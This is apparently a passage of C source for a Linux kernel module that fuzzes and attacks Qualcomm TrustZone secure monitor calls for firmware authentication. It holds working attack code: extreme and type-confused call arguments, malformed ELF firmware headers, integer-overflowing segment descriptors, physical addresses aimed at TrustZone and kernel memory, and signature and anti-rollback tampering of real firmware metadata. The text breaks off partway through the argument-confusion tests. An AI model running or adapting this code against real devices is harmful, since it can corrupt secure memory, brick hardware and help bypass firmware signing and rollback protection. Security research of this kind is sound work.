/*
 * scm_fuzz5.c - Advanced SCM/TZ attack vectors
 *
 * Tests:
 *  op=0: SCM arg overflow - extreme values in scm_call2 args
 *  op=1: ELF parser fuzz - malformed ELF headers sent via init_image
 *  op=2: Integer overflow in segment descriptors (crafted phdrs)
 *  op=3: Memory confusion - init_image pointing to TZ/device memory
 *  op=4: Rollback - test anti-rollback with various sw_version fields
 *  op=5: SCM arg type confusion - wrong arginfo types
 *  op=6: Double-free / use-after-free in PAS state machine
 *  op=7: Overlapping PIL regions - two subsystems sharing memory
 *  op=8: Modem subsystem exploration
 *  op=9: Large metadata - oversized ELF with many segments
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/moduleparam.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/vmalloc.h>
#include <asm/io.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("SCM PIL Auth Fuzzer v5 - Advanced attack vectors");

/* ---- parameters ---- */
static int op = -1;
static int pid_val = -1;
static int svc_val = -1;
static int cmd_val = -1;
static int sub_test = 0;      /* sub-test number within each op */
static int max_tests = 10;    /* max iterations */
static unsigned long arg1_val = 0;
static unsigned long arg2_val = 0;
static unsigned long arg3_val = 0;
static char *meta_path = "/tmp/fw_meta.bin";

module_param(op, int, 0);
module_param(pid_val, int, 0);
module_param(svc_val, int, 0);
module_param(cmd_val, int, 0);
module_param(sub_test, int, 0);
module_param(max_tests, int, 0);
module_param(arg1_val, ulong, 0);
module_param(arg2_val, ulong, 0);
module_param(arg3_val, ulong, 0);
module_param(meta_path, charp, 0);

/* ---- SCM interface ---- */
#define MAX_SCM_ARGS 10
#define MAX_SCM_RETS 3

struct scm_desc {
    u32 arginfo;
    u64 args[MAX_SCM_ARGS];
    u64 ret[MAX_SCM_RETS];
    u64 __pad[8]; /* vendor scm_call2 may write beyond standard fields */
};

#define SCM_VAL   0x0
#define SCM_RO    0x1
#define SCM_RW    0x2
#define SCM_BUFVAL 0x3

#define SCM_ARGS_1(a)        (1 | ((a) << 4))
#define SCM_ARGS_2(a,b)      (2 | ((a) << 4) | ((b) << 6))
#define SCM_ARGS_3(a,b,c)    (3 | ((a) << 4) | ((b) << 6) | ((c) << 8))
#define SCM_ARGS_4(a,b,c,d)  (4 | ((a) << 4) | ((b) << 6) | ((c) << 8) | ((d) << 10))

#define QCOM_SCM_FNID(svc, cmd)   (((svc) & 0xFF) << 8 | ((cmd) & 0xFF))
#define SCM_SIP_FNID(svc, cmd)    (0x42000000UL | QCOM_SCM_FNID(svc, cmd))

#define PAS_SVC                   0x02
#define PAS_INIT_IMAGE_CMD        0x01
#define PAS_MEM_SETUP_CMD         0x02
#define PAS_AUTH_AND_RESET_CMD    0x05
#define PAS_SHUTDOWN_CMD          0x06
#define PAS_IS_SUPPORTED_CMD      0x07

extern int scm_call2(u32 fn_id, struct scm_desc *desc);
extern bool scm_is_call_available(u32 svc_id, u32 cmd_id);

/* Cache maintenance — exported by kernel */
extern void __dma_flush_area(const void *start, size_t size);

/* ---- PAS helpers (marked __init to stay in same section as init func) ---- */
static int __init do_pas_shutdown(u32 peripheral)
{
    struct scm_desc desc = {};
    desc.arginfo = SCM_ARGS_1(SCM_VAL);
    desc.args[0] = peripheral;
    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_SHUTDOWN_CMD), &desc);
}

static int __init do_pas_init_image_nc(u32 peripheral, const void *data, size_t size)
{
    void *buf;
    phys_addr_t phys;
    struct scm_desc desc;
    int ret;
    int order = get_order(size);

    buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, order);
    if (!buf) return -ENOMEM;

    memcpy(buf, data, size);

    /* Flush CPU cache so TZ sees current data via physical address */
    __dma_flush_area(buf, PAGE_SIZE << order);

    phys = virt_to_phys(buf);

    memset(&desc, 0, sizeof(desc));
    desc.arginfo = 2 | (0 << 4) | (2 << 6);
    desc.args[0] = peripheral;
    desc.args[1] = phys;

    pr_info("scm_fuzz5: init_image_nc pid=%u phys=0x%llx size=%zu order=%d\n",
            peripheral, (u64)phys, size, order);
    ret = scm_call2(0x42000201, &desc);
    pr_info("scm_fuzz5: init_image_nc ret=%d\n", ret);

    free_pages((unsigned long)buf, order);
    return ret;
}

/* Backward compat wrapper — all callers of do_pas_init_image now use nc */
static int __init do_pas_init_image(u32 peripheral, void *meta_virt, size_t size)
{
    return do_pas_init_image_nc(peripheral, meta_virt, size);
}

static int __init do_pas_mem_setup(u32 peripheral, phys_addr_t addr, phys_addr_t size)
{
    struct scm_desc desc = {};
    desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
    desc.args[0] = peripheral;
    desc.args[1] = addr;
    desc.args[2] = size;
    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_MEM_SETUP_CMD), &desc);
}

static int __init do_pas_auth_reset(u32 peripheral)
{
    struct scm_desc desc = {};
    desc.arginfo = SCM_ARGS_1(SCM_VAL);
    desc.args[0] = peripheral;
    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
}

/* Read file into kmalloc buffer */
static void * __init read_file_buf(const char *path, size_t *out_size)
{
    struct file *f;
    loff_t fsize, pos = 0;
    void *buf;
    ssize_t nread;

    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f)) return NULL;
    fsize = i_size_read(file_inode(f));
    if (fsize <= 0 || fsize > 64 * 1024) { filp_close(f, NULL); return NULL; }
    buf = kzalloc(fsize, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return NULL; }
    nread = kernel_read(f, buf, fsize, &pos);
    filp_close(f, NULL);
    if (nread != fsize) { kfree(buf); return NULL; }
    *out_size = fsize;
    return buf;
}

/* ============================================================
 * ELF32 structures for crafting malformed firmware metadata
 * ============================================================ */
typedef struct {
    u8  e_ident[16];
    u16 e_type;
    u16 e_machine;
    u32 e_version;
    u32 e_entry;
    u32 e_phoff;
    u32 e_shoff;
    u32 e_flags;
    u16 e_ehsize;
    u16 e_phentsize;
    u16 e_phnum;
    u16 e_shentsize;
    u16 e_shnum;
    u16 e_shstrndx;
} __attribute__((packed)) Elf32_Ehdr_t;

typedef struct {
    u32 p_type;
    u32 p_offset;
    u32 p_vaddr;
    u32 p_paddr;
    u32 p_filesz;
    u32 p_memsz;
    u32 p_flags;
    u32 p_align;
} __attribute__((packed)) Elf32_Phdr_t;

/* Build a minimal valid-looking ELF32 header */
static void __init build_base_elf(Elf32_Ehdr_t *ehdr, int phnum)
{
    memset(ehdr, 0, sizeof(*ehdr));
    ehdr->e_ident[0] = 0x7f;
    ehdr->e_ident[1] = 'E';
    ehdr->e_ident[2] = 'L';
    ehdr->e_ident[3] = 'F';
    ehdr->e_ident[4] = 1; /* ELFCLASS32 */
    ehdr->e_ident[5] = 1; /* ELFDATA2LSB */
    ehdr->e_ident[6] = 1; /* EV_CURRENT */
    ehdr->e_type = 2;     /* ET_EXEC */
    ehdr->e_machine = 0x5e; /* Qualcomm video (venus) */
    ehdr->e_version = 1;
    ehdr->e_entry = 0x0f500000;
    ehdr->e_phoff = sizeof(Elf32_Ehdr_t);
    ehdr->e_ehsize = sizeof(Elf32_Ehdr_t);
    ehdr->e_phentsize = sizeof(Elf32_Phdr_t);
    ehdr->e_phnum = phnum;
}

static int __init scm_fuzz5_init(void)
{
    int ret = 0;
    int i;

    pr_info("scm_fuzz5: === START === op=%d sub=%d pid=0x%x svc=0x%x cmd=0x%x "
            "arg1=0x%lx arg2=0x%lx arg3=0x%lx\n",
            op, sub_test, pid_val, svc_val, cmd_val,
            arg1_val, arg2_val, arg3_val);

    switch (op) {

    case 0: /* ============================================
             * SCM argument overflow / extreme values
             * Try to trigger buffer overflow in TZ SMC handler
             * ============================================ */
    {
        struct scm_desc desc;
        /* Test vectors: extreme arg values that might overflow TZ buffers */
        static const struct {
            int svc, cmd, na;
            u64 a0, a1, a2;
            u32 arginfo_override; /* 0 = auto */
            const char *label;
        } vectors[] = {
            /* PAS init_image with huge phys addr (above DRAM) */
            {2, 1, 2, 9, 0xFFFFFFFFFFFFFFFFULL, 0, 0, "init_image huge_addr"},
            /* PAS init_image with addr=0 (NULL metadata) */
            {2, 1, 2, 9, 0, 0, 0, "init_image null_addr"},
            /* PAS init_image with addr in TZ region */
            {2, 1, 2, 9, 0xefd00000, 0, 0, "init_image tz_addr"},
            /* PAS init_image with addr in IMEM */
            {2, 1, 2, 9, 0x14680000, 0, 0, "init_image imem_addr"},
            /* PAS mem_setup with huge size */
            {2, 2, 3, 9, 0x86a00000, 0xFFFFFFFFULL, 0, "mem_setup huge_size"},
            /* PAS mem_setup with size=0 */
            {2, 2, 3, 9, 0x86a00000, 0, 0, "mem_setup zero_size"},
            /* PAS mem_setup with TZ region */
            {2, 2, 3, 9, 0xefd00000, 0x280000, 0, "mem_setup tz_region"},
            /* PAS mem_setup with kernel text */
            {2, 2, 3, 9, 0x80000000, 0x1000000, 0, "mem_setup kernel_text"},
            /* PAS auth with huge PID */
            {2, 5, 1, 0xFFFFFFFF, 0, 0, 0, "auth huge_pid"},
            /* PAS auth with negative PID */
            {2, 5, 1, 0x80000000, 0, 0, 0, "auth neg_pid"},
            /* SCM with 10 args (max) - fill descriptor */
            {2, 1, 2, 9, 0x86a00000, 0, 0, "init_image normal_but_10args"},
            /* PAS shutdown with huge PID */
            {2, 6, 1, 0xFFFFFFFF, 0, 0, 0, "shutdown huge_pid"},
            /* Memory protection with TZ addr */
            {0x0c, 4, 3, 0xefd00000, 0x280000, 0, 0, "mp tz_region"},
            /* IO access - read TZ register */
            {0x06, 4, 1, 0x00100000, 0, 0, 0, "io_read low_addr"},
        };
        int nvec = sizeof(vectors) / sizeof(vectors[0]);
        int start = sub_test;
        int end = (sub_test + max_tests < nvec) ? sub_test + max_tests : nvec;

        for (i = start; i < end; i++) {
            memset(&desc, 0, sizeof(desc));
            switch (vectors[i].na) {
            case 1: desc.arginfo = SCM_ARGS_1(SCM_VAL); break;
            case 2: desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_RW); break;
            case 3: desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL); break;
            }
            if (vectors[i].arginfo_override)
                desc.arginfo = vectors[i].arginfo_override;
            desc.args[0] = vectors[i].a0;
            desc.args[1] = vectors[i].a1;
            desc.args[2] = vectors[i].a2;

            pr_info("scm_fuzz5: [%d] %s svc=0x%x cmd=0x%x a0=0x%llx a1=0x%llx a2=0x%llx\n",
                    i, vectors[i].label,
                    vectors[i].svc, vectors[i].cmd,
                    desc.args[0], desc.args[1], desc.args[2]);

            ret = scm_call2(SCM_SIP_FNID(vectors[i].svc, vectors[i].cmd), &desc);

            pr_info("scm_fuzz5: [%d] %s ret=%d r0=0x%llx r1=0x%llx r2=0x%llx\n",
                    i, vectors[i].label, ret,
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            msleep(10);
        }
    }
    break;

    case 1: /* ============================================
             * ELF parser fuzzing - malformed headers
             * Crafts intentionally broken ELF metadata
             * ============================================ */
    {
        /* We need a base valid venus.mdt to mutate from */
        void *base_mdt;
        size_t mdt_size;
        void *fuzz_buf;
        int test_id;

        pr_info("scm_fuzz5: ELF reading %s...\n", meta_path);
        base_mdt = read_file_buf(meta_path, &mdt_size);
        if (!base_mdt) {
            pr_err("scm_fuzz5: cannot read %s\n", meta_path);
            return -ENOENT;
        }
        pr_info("scm_fuzz5: ELF read OK, mdt_size=%zu\n", mdt_size);
        /* Working buffer */
        fuzz_buf = kzalloc(mdt_size, GFP_KERNEL);
        if (!fuzz_buf) { kfree(base_mdt); return -ENOMEM; }
        pr_info("scm_fuzz5: ELF fuzz_buf=%px phys=0x%llx\n",
                fuzz_buf, (u64)virt_to_phys(fuzz_buf));

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            Elf32_Ehdr_t *ehdr;
            Elf32_Phdr_t *phdrs;

            /* Start from valid metadata */
            memcpy(fuzz_buf, base_mdt, mdt_size);
            ehdr = (Elf32_Ehdr_t *)fuzz_buf;
            phdrs = (Elf32_Phdr_t *)(fuzz_buf + ehdr->e_phoff);

            /* Must shutdown first to clean state */
            pr_info("scm_fuzz5: ELF[%d] calling shutdown...\n", test_id);
            do_pas_shutdown(pid_val);
            pr_info("scm_fuzz5: ELF[%d] shutdown done\n", test_id);
            msleep(5);

            switch (test_id) {
            case 0: /* phnum = 0 */
                ehdr->e_phnum = 0;
                pr_info("scm_fuzz5: ELF[%d] phnum=0\n", test_id);
                break;
            case 1: /* phnum = 0xFFFF (huge) */
                ehdr->e_phnum = 0xFFFF;
                pr_info("scm_fuzz5: ELF[%d] phnum=0xFFFF\n", test_id);
                break;
            case 2: /* phoff beyond file */
                ehdr->e_phoff = 0xFFFFFFFF;
                pr_info("scm_fuzz5: ELF[%d] phoff=0xFFFFFFFF\n", test_id);
                break;
            case 3: /* phentsize = 0 */
                ehdr->e_phentsize = 0;
                pr_info("scm_fuzz5: ELF[%d] phentsize=0\n", test_id);
                break;
            case 4: /* phentsize very large */
                ehdr->e_phentsize = 0xFFFF;
                pr_info("scm_fuzz5: ELF[%d] phentsize=0xFFFF\n", test_id);
                break;
            case 5: /* e_type = ET_NONE */
                ehdr->e_type = 0;
                pr_info("scm_fuzz5: ELF[%d] e_type=0\n", test_id);
                break;
            case 6: /* e_machine = 0 */
                ehdr->e_machine = 0;
                pr_info("scm_fuzz5: ELF[%d] e_machine=0\n", test_id);
                break;
            case 7: /* Corrupt ELF magic */
                ehdr->e_ident[0] = 0x00;
                pr_info("scm_fuzz5: ELF[%d] bad_magic\n", test_id);
                break;
            case 8: /* ELF class = 64-bit */
                ehdr->e_ident[4] = 2; /* ELFCLASS64 */
                pr_info("scm_fuzz5: ELF[%d] class64\n", test_id);
                break;
            case 9: /* Big endian */
                ehdr->e_ident[5] = 2; /* ELFDATA2MSB */
                pr_info("scm_fuzz5: ELF[%d] big_endian\n", test_id);
                break;
            case 10: /* entry = 0 */
                ehdr->e_entry = 0;
                pr_info("scm_fuzz5: ELF[%d] entry=0\n", test_id);
                break;
            case 11: /* entry = TZ region */
                ehdr->e_entry = 0xefd00000;
                pr_info("scm_fuzz5: ELF[%d] entry=TZ\n", test_id);
                break;
            case 12: /* Segment paddr = TZ region */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_paddr = 0xefd00000;
                    phdrs[2].p_memsz = 0x1000;
                    phdrs[2].p_filesz = 0x1000;
                    pr_info("scm_fuzz5: ELF[%d] seg2_paddr=TZ\n", test_id);
                }
                break;
            case 13: /* Segment paddr = 0 (NULL) */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_paddr = 0;
                    phdrs[2].p_memsz = 0x1000;
                    pr_info("scm_fuzz5: ELF[%d] seg2_paddr=0\n", test_id);
                }
                break;
            case 14: /* Overlapping segments */
                if (ehdr->e_phnum > 3) {
                    phdrs[3].p_paddr = phdrs[2].p_paddr;
                    phdrs[3].p_memsz = phdrs[2].p_memsz;
                    pr_info("scm_fuzz5: ELF[%d] overlapping_segs\n", test_id);
                }
                break;
            case 15: /* Segment memsz > filesz (BSS-like huge) */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_memsz = 0xFFFFFFFF;
                    phdrs[2].p_filesz = 0x100;
                    pr_info("scm_fuzz5: ELF[%d] huge_memsz\n", test_id);
                }
                break;
            case 16: /* Segment filesz > memsz (impossible) */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_filesz = 0xFFFFFFFF;
                    phdrs[2].p_memsz = 0x100;
                    pr_info("scm_fuzz5: ELF[%d] filesz>memsz\n", test_id);
                }
                break;
            case 17: /* Segment extends into GIC/APIC area */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_paddr = 0x17A00000; /* GIC distributor */
                    phdrs[2].p_memsz = 0x10000;
                    phdrs[2].p_filesz = 0x10000;
                    pr_info("scm_fuzz5: ELF[%d] seg_gic\n", test_id);
                }
                break;
            case 18: /* Negative p_offset via integer wrap */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_offset = 0xFFFFF000;
                    pr_info("scm_fuzz5: ELF[%d] neg_offset\n", test_id);
                }
                break;
            case 19: /* p_align = 0 */
                if (ehdr->e_phnum > 2) {
                    phdrs[2].p_align = 0;
                    pr_info("scm_fuzz5: ELF[%d] align=0\n", test_id);
                }
                break;
            default:
                pr_info("scm_fuzz5: ELF[%d] no more tests\n", test_id);
                goto elf_done;
            }

            pr_info("scm_fuzz5: ELF[%d] >>> calling init_image...\n", test_id);
            ret = do_pas_init_image(pid_val, fuzz_buf, mdt_size);
            pr_info("scm_fuzz5: ELF[%d] <<< init_image ret=%d %s\n",
                    test_id, ret, ret == 0 ? "*** ACCEPTED ***" : "rejected");
            msleep(10);
        }
elf_done:
        kfree(fuzz_buf);
        kfree(base_mdt);
    }
    break;

    case 2: /* ============================================
             * Integer overflow in segment descriptors
             * Craft phdrs to force TZ to compute bad addresses
             * ============================================ */
    {
        /* Create a completely synthetic ELF with carefully crafted segments */
        size_t num_segs = 4;
        size_t buf_size = sizeof(Elf32_Ehdr_t) + num_segs * sizeof(Elf32_Phdr_t);
        void *buf;
        Elf32_Ehdr_t *ehdr;
        Elf32_Phdr_t *phdrs;
        int test_id;

        buf = kzalloc(PAGE_SIZE, GFP_KERNEL);
        if (!buf) return -ENOMEM;

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            ehdr = (Elf32_Ehdr_t *)buf;
            build_base_elf(ehdr, num_segs);
            phdrs = (Elf32_Phdr_t *)(buf + sizeof(Elf32_Ehdr_t));
            memset(phdrs, 0, num_segs * sizeof(Elf32_Phdr_t));

            /* Segment 0: hash segment (type=0, flags=0x02200000) */
            phdrs[0].p_type = 0;
            phdrs[0].p_flags = 0x02200000;

            /* Segment 1: hash table */
            phdrs[1].p_type = 0;
            phdrs[1].p_flags = 0x02200000;

            do_pas_shutdown(pid_val);
            msleep(5);

            switch (test_id) {
            case 0: /* paddr + memsz wraps to 0 */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0xFFFFF000;
                phdrs[2].p_memsz = 0x2000; /* wraps to 0x1000 */
                phdrs[2].p_filesz = 0x100;
                pr_info("scm_fuzz5: INT[%d] paddr+memsz_wrap32\n", test_id);
                break;
            case 1: /* paddr exactly at 0 */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x00000000;
                phdrs[2].p_memsz = 0x1000;
                phdrs[2].p_filesz = 0x100;
                pr_info("scm_fuzz5: INT[%d] paddr=0\n", test_id);
                break;
            case 2: /* memsz = 0xFFFFFFFF */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x0f500000;
                phdrs[2].p_memsz = 0xFFFFFFFF;
                phdrs[2].p_filesz = 0x100;
                pr_info("scm_fuzz5: INT[%d] memsz=MAX\n", test_id);
                break;
            case 3: /* filesz = 0xFFFFFFFF */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x0f500000;
                phdrs[2].p_memsz = 0x1000;
                phdrs[2].p_filesz = 0xFFFFFFFF;
                pr_info("scm_fuzz5: INT[%d] filesz=MAX\n", test_id);
                break;
            case 4: /* Two segments that together overflow */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x80000000;
                phdrs[2].p_memsz = 0x40000000;
                phdrs[2].p_filesz = 0x100;
                phdrs[3].p_type = 1; phdrs[3].p_flags = 0x08000005;
                phdrs[3].p_paddr = 0xC0000000;
                phdrs[3].p_memsz = 0x40000000;
                phdrs[3].p_filesz = 0x100;
                pr_info("scm_fuzz5: INT[%d] two_segs_overflow\n", test_id);
                break;
            case 5: /* Segment pointing to RPM/SMD */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x04200000; /* RPM MSG RAM */
                phdrs[2].p_memsz = 0x1000;
                phdrs[2].p_filesz = 0x1000;
                pr_info("scm_fuzz5: INT[%d] seg_rpm\n", test_id);
                break;
            case 6: /* Segment at OCIMEM */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x14680000;
                phdrs[2].p_memsz = 0x1000;
                phdrs[2].p_filesz = 0x1000;
                pr_info("scm_fuzz5: INT[%d] seg_ocimem\n", test_id);
                break;
            case 7: /* Segment covering another PIL region (modem) */
                phdrs[2].p_type = 1; phdrs[2].p_flags = 0x08000005;
                phdrs[2].p_paddr = 0x8b800000; /* modem region */
                phdrs[2].p_memsz = 0x1000;
                phdrs[2].p_filesz = 0x1000;
                pr_info("scm_fuzz5: INT[%d] seg_modem_region\n", test_id);
                break;
            case 8: /* No LOAD segments at all */
                /* Only hash segments */
                ehdr->e_phnum = 2;
                pr_info("scm_fuzz5: INT[%d] no_load_segs\n", test_id);
                break;
            case 9: /* 200+ segments (stress test parser) */
                ehdr->e_phnum = 200;
                for (i = 0; i < 200 && (sizeof(Elf32_Ehdr_t) + (i+1)*sizeof(Elf32_Phdr_t)) < PAGE_SIZE; i++) {
                    Elf32_Phdr_t *p = (Elf32_Phdr_t *)(buf + sizeof(Elf32_Ehdr_t) + i * sizeof(Elf32_Phdr_t));
                    p->p_type = 1;
                    p->p_flags = 0x08000005;
                    p->p_paddr = 0x0f500000 + i * 0x1000;
                    p->p_memsz = 0x1000;
                    p->p_filesz = 0x100;
                }
                pr_info("scm_fuzz5: INT[%d] 200_segments\n", test_id);
                break;
            default:
                pr_info("scm_fuzz5: INT[%d] no more tests\n", test_id);
                goto int_done;
            }

            ret = do_pas_init_image(pid_val, buf, PAGE_SIZE);
            pr_info("scm_fuzz5: INT[%d] init_image ret=%d %s\n",
                    test_id, ret, ret == 0 ? "*** ACCEPTED ***" : "rejected");
            msleep(10);
        }
int_done:
        kfree(buf);
    }
    break;

    case 3: /* ============================================
             * Memory confusion attacks
             * Pass physical addresses of interesting regions
             * to init_image as "metadata"
             * ============================================ */
    {
        struct scm_desc desc;
        static const struct {
            u64 addr;
            const char *label;
        } addrs[] = {
            {0x00000000, "null"},
            {0x00001000, "low_mem"},
            {0x04200000, "rpm_msg_ram"},
            {0x0B000000, "ipa_region"},
            {0x14680000, "ocimem"},
            {0x17A00000, "gic_dist"},
            {0x80000000, "kernel_text"},
            {0x86a00000, "venus_pil"},
            {0x88d00000, "adsp_pil"},
            {0x8b500000, "wlan_fw"},
            {0x8b800000, "modem_pil"},
            {0xefd00000, "tz_region"},
            {0xFFFFF000, "top_32bit"},
        };
        int naddrs = sizeof(addrs) / sizeof(addrs[0]);

        do_pas_shutdown(pid_val);
        msleep(5);

        for (i = sub_test; i < naddrs && i < sub_test + max_tests; i++) {
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_RW);
            desc.args[0] = 9; /* venus PID */
            desc.args[1] = addrs[i].addr;

            pr_info("scm_fuzz5: MEM[%d] init_image phys=0x%llx (%s)\n",
                    i, addrs[i].addr, addrs[i].label);

            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_INIT_IMAGE_CMD), &desc);
            pr_info("scm_fuzz5: MEM[%d] ret=%d r0=0x%llx %s\n",
                    i, ret, desc.ret[0],
                    ret == 0 ? "*** ACCEPTED ***" : "");
            msleep(10);
        }
    }
    break;

    case 4: /* ============================================
             * Rollback attack testing
             * Modify version fields in real mdt, test if
             * anti-rollback fuses are checked
             * ============================================ */
    {
        void *mdt;
        size_t mdt_size;
        Elf32_Ehdr_t *ehdr;
        Elf32_Phdr_t *phdrs;
        int test_id;

        mdt = read_file_buf(meta_path, &mdt_size);
        if (!mdt) { pr_err("scm_fuzz5: cannot read %s\n", meta_path); return -ENOENT; }

        pr_info("scm_fuzz5: Rollback test with %zu byte metadata\n", mdt_size);
        ehdr = (Elf32_Ehdr_t *)mdt;
        phdrs = (Elf32_Phdr_t *)(mdt + ehdr->e_phoff);

        /* Dump hash segment to understand version info layout */
        pr_info("scm_fuzz5: phnum=%d phoff=0x%x\n", ehdr->e_phnum, ehdr->e_phoff);
        for (i = 0; i < ehdr->e_phnum && i < 5; i++) {
            pr_info("scm_fuzz5: seg[%d] type=0x%x off=0x%x pa=0x%x fsz=0x%x fl=0x%x\n",
                    i, phdrs[i].p_type, phdrs[i].p_offset,
                    phdrs[i].p_paddr, phdrs[i].p_filesz, phdrs[i].p_flags);
        }

        /* The hash segment (seg[1]) typically contains:
         * - Certificate chain
         * - Signature
         * - Hash table
         * - sw_version (anti-rollback)
         * We test what happens with various mutations */

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            void *fuzz;
            fuzz = kzalloc(mdt_size, GFP_KERNEL);
            if (!fuzz) break;
            memcpy(fuzz, mdt, mdt_size);

            do_pas_shutdown(pid_val);
            msleep(5);

            switch (test_id) {
            case 0: /* Unmodified - baseline (should succeed) */
                pr_info("scm_fuzz5: ROLL[%d] unmodified baseline\n", test_id);
                break;
            case 1: /* Zero out hash segment data */
                if (ehdr->e_phnum > 1 && phdrs[1].p_filesz > 0) {
                    Elf32_Phdr_t *hp = (Elf32_Phdr_t *)(fuzz + ehdr->e_phoff) + 1;
                    u32 off = hp->p_offset;
                    u32 sz = hp->p_filesz;
                    if (off + sz <= mdt_size)
                        memset(fuzz + off, 0, sz);
                    pr_info("scm_fuzz5: ROLL[%d] zeroed hash seg off=0x%x sz=0x%x\n",
                            test_id, off, sz);
                }
                break;
            case 2: /* Flip single bit in certificate chain */
                {
                    /* Cert chain is usually near start of hash segment */
                    u32 cert_off = phdrs[1].p_offset + 0x10;
                    if (cert_off < mdt_size) {
                        ((u8*)fuzz)[cert_off] ^= 0x01;
                        pr_info("scm_fuzz5: ROLL[%d] flip cert bit at 0x%x\n",
                                test_id, cert_off);
                    }
                }
                break;
            case 3: /* Modify flags field (might contain version) */
                {
                    Elf32_Phdr_t *fp = (Elf32_Phdr_t *)(fuzz + ehdr->e_phoff);
                    /* Seg 0 flags often encode version info */
                    u32 orig = fp[0].p_flags;
                    fp[0].p_flags = 0;
                    pr_info("scm_fuzz5: ROLL[%d] seg0 flags 0x%x->0\n",
                            test_id, orig);
                }
                break;
            case 4: /* Modify seg[0] flags to look like older version */
                {
                    Elf32_Phdr_t *fp = (Elf32_Phdr_t *)(fuzz + ehdr->e_phoff);
                    u32 orig = fp[0].p_flags;
                    fp[0].p_flags = (orig & 0xFF) | 0x01000000;
                    pr_info("scm_fuzz5: ROLL[%d] seg0 flags downgraded 0x%x->0x%x\n",
                            test_id, orig, fp[0].p_flags);
                }
                break;
            case 5: /* Scan metadata for sw_id/version patterns */
                {
                    /* Search for MBN header magic or sw_version fields */
                    u32 j;
                    pr_info("scm_fuzz5: ROLL[%d] scanning metadata bytes:\n", test_id);
                    /* Dump first 128 bytes after ELF header and phdrs */
                    u32 data_start = ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr_t);
                    if (data_start + 128 <= mdt_size) {
                        for (j = 0; j < 128; j += 16) {
                            u32 *dw = (u32*)(mdt + data_start + j);
                            pr_info("  +0x%04x: %08x %08x %08x %08x\n",
                                    data_start + j,
                                    dw[0], dw[1], dw[2], dw[3]);
                        }
                    }
                    /* Also dump hash segment data */
                    if (phdrs[1].p_offset + 128 <= mdt_size) {
                        pr_info("scm_fuzz5: hash seg data:\n");
                        for (j = 0; j < 128; j += 16) {
                            u32 *dw = (u32*)(mdt + phdrs[1].p_offset + j);
                            pr_info("  +0x%04x: %08x %08x %08x %08x\n",
                                    phdrs[1].p_offset + j,
                                    dw[0], dw[1], dw[2], dw[3]);
                        }
                    }
                }
                break;
            case 6: /* Try with a completely empty metadata (just ELF header) */
                {
                    void *mini = kzalloc(PAGE_SIZE, GFP_KERNEL);
                    if (mini) {
                        build_base_elf((Elf32_Ehdr_t*)mini, 0);
                        do_pas_shutdown(pid_val);
                        msleep(5);
                        ret = do_pas_init_image(pid_val, mini, PAGE_SIZE);
                        pr_info("scm_fuzz5: ROLL[%d] minimal_elf ret=%d %s\n",
                                test_id, ret, ret == 0 ? "*** ACCEPTED ***" : "rejected");
                        kfree(mini);
                        kfree(fuzz);
                        continue;
                    }
                }
                break;
            default:
                pr_info("scm_fuzz5: ROLL[%d] no more tests\n", test_id);
                kfree(fuzz);
                goto roll_done;
            }

            ret = do_pas_init_image(pid_val, fuzz, mdt_size);
            pr_info("scm_fuzz5: ROLL[%d] init_image ret=%d %s\n",
                    test_id, ret, ret == 0 ? "*** ACCEPTED ***" : "rejected");
            kfree(fuzz);
            msleep(10);
        }
roll_done:
        kfree(mdt);
    }
    break;

    case 5: /* ============================================
             * SCM arg type confusion
             * Use wrong arginfo type descriptors to trick
             * TZ into treating values as buffers
             * ============================================ */
    {
        struct scm_desc desc;
        int test_id;

        for (test_id = sub_test; test_id < sub_test + max_tests; test_id++) {
            memset(&desc, 0, sizeof(desc));

            switch (test_id) {
            case 0: /* init_image: treat PID as buffer ptr */
                desc.arginfo = SCM_ARGS_2(SCM_RW, SCM_VAL);
                desc.args[0] = 9;
                desc.args[1] = 0x86a00000;
                pr_info("scm_fuzz5: TYPE[%d] init pid_as_buf\n", test_id);
                ret = scm_call2(SCM_SIP_FNID(2, 1), &desc);
                break;
            case 1: /* init_image: both args as SCM_RO */
                desc.arginfo = SCM_ARGS_2(SCM_RO, SCM_RO);
                desc.args[0] = 9;
                desc.args[1] = 0x86a00000;
                pr_info("scm_fuzz5: TYPE[%d] init both_RO\n", test_id);
